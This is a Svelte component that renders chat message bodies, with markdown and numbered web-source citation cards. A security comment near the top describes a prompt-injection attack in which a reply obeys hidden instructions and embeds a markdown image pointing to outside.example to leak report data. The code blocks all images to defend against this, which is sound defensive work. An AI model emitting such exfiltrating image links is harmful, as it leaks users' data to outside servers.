<script lang="ts">
  import type { Snippet } from "svelte";
  import { Streamdown } from "svelte-streamdown";
  import { cn } from "$lib/utils";
  import { citationNumber, citationSources, markCitations, type WebSource } from "$lib/chat/webSources";
  import { faviconUrlFor } from "./sourceContext";
  import { getMessageRoleContext, type MessageRole } from "./context";

  /**
   * The message body. Role comes from the wrapping <Message> (overridable):
   * user = primary-tinted bubble, assistant = plain ink. `markdown` renders
   * `text` through svelte-streamdown (streaming-safe, `chat-markdown` CSS);
   * otherwise `children` (custom layout) or `text` as pre-wrapped plain text.
   */
  interface Props {
    /** Render `text` as markdown (assistant replies). */
    markdown?: boolean;
    /** Message text; alternative to children for simple content. */
    text?: string;
    /**
     * Chat parity Phase B: this reply's numbered web sources. A `[n]` the
     * reply cites becomes a numbered source card; any other bracket stays
     * plain text.
     */
    citations?: readonly WebSource[];
    /** Override the role inherited from <Message>. */
    role?: MessageRole;
    class?: string;
    children?: Snippet;
  }

  let { markdown = false, text = "", citations = [], role, class: className, children }: Props = $props();

  // Security (2026-10-06): model output never loads an image. A reply that
  // follows an instruction hidden in a transcript, document or web source
  // could otherwise embed ![](https://outside.example/?d=...) and send report
  // data to that server just by being shown. Streamdown renders a blocked
  // image as "[Image blocked: alt]". Links stay http and https only (the
  // wildcard's own rule) and need a click.
  const NO_IMAGES: string[] = [];

  // Phase B: citation pills and their popover in design tokens (Streamdown's
  // default theme names shadcn classes the app does not define).
  const CITATION_THEME = {
    inlineCitation: {
      preview:
        "mx-0.5 inline-flex h-[1.125rem] min-w-[1.125rem] items-center justify-center rounded-full border-0 bg-chrome px-1.5 py-0 align-[0.1em] text-[0.6875rem] leading-none font-normal text-ink-muted tabular-nums transition-colors hover:bg-primary-wash hover:text-primary-selected focus:outline-none focus:ring-2 focus:ring-primary/30",
    },
    components: {
      popover: "min-w-[15rem] max-w-[20rem] rounded-xl border border-line bg-white p-1.5 text-ink shadow-lg",
    },
  };

  const inherited = getMessageRoleContext();
  const resolvedRole = $derived(role ?? inherited?.role ?? "assistant");

  const sourceMap = $derived(citationSources(citations));
  const numbers = $derived(new Set(citations.map((source) => source.n)));
  const shown = $derived(markCitations(text, numbers));

  /** The sources a citation names, in the order it names them. */
  function cited(keys: readonly string[]): WebSource[] {
    return keys.flatMap((key) => {
      const n = citationNumber(key);
      const source = n === null ? undefined : citations.find((candidate) => candidate.n === n);
      return source ? [source] : [];
    });
  }

  const roleClass = $derived(
    resolvedRole === "user"
      ? "chat-fluid-text ml-auto w-fit max-w-[min(18.75rem,90%)] rounded-xl bg-gray-50 px-3.5 py-2.5 font-sans leading-[1.45] text-ink"
      : cn("chat-fluid-text leading-normal text-ink", markdown && "chat-markdown")
  );
</script>

{#snippet citationPreview({ token }: { token: { keys: string[] } })}
  <span class="sr-only">Source </span>{cited(token.keys).map((source) => source.n).join(", ")}
{/snippet}

{#snippet citationPopover({ token }: { token: { keys: string[] } })}
  <!-- Divs with list roles, and important utilities on the link: the
       unlayered `.chat-markdown` list and link rules would otherwise win. -->
  <div role="list" class="flex flex-col gap-0.5" data-citation-popover>
    {#each cited(token.keys) as source (source.n)}
      {@const favicon = faviconUrlFor(source.url)}
      <div role="listitem">
        <a
          href={source.url}
          target="_blank"
          rel="noopener noreferrer"
          referrerpolicy="no-referrer"
          class="flex min-w-0 items-start gap-2 rounded-lg px-2 py-1.5 text-xs text-ink! no-underline! transition-colors hover:bg-primary-wash focus-visible:bg-primary-wash focus-visible:outline-none"
        >
          <span class="text-data mt-px shrink-0 text-ink-muted">{source.n}</span>
          {#if favicon}
            <img src={favicon} alt="" width="14" height="14" referrerpolicy="no-referrer" class="mt-px h-3.5 w-3.5 shrink-0 rounded-sm" />
          {/if}
          <span class="flex min-w-0 flex-col">
            <span class="line-clamp-2 text-ink">{source.title}</span>
            <span class="truncate text-ink-muted">{source.domain}</span>
          </span>
        </a>
      </div>
    {/each}
  </div>
{/snippet}

<div class={cn(roleClass, className)}>
  {#if markdown}
    <!-- One instance whether or not sources have arrived, so a reply that
         gains its sources mid-stream is not rebuilt. With no sources none are
         passed, and every bracket renders as written. -->
    <Streamdown
      content={shown}
      allowedImagePrefixes={NO_IMAGES}
      sources={citations.length ? sourceMap : undefined}
      inlineCitationsMode="list"
      theme={CITATION_THEME}
      inlineCitationPreview={citationPreview}
      inlineCitationPopover={citationPopover}
    />
  {:else if children}
    {@render children()}
  {:else}
    <p class="whitespace-pre-wrap">{text}</p>
  {/if}
</div>
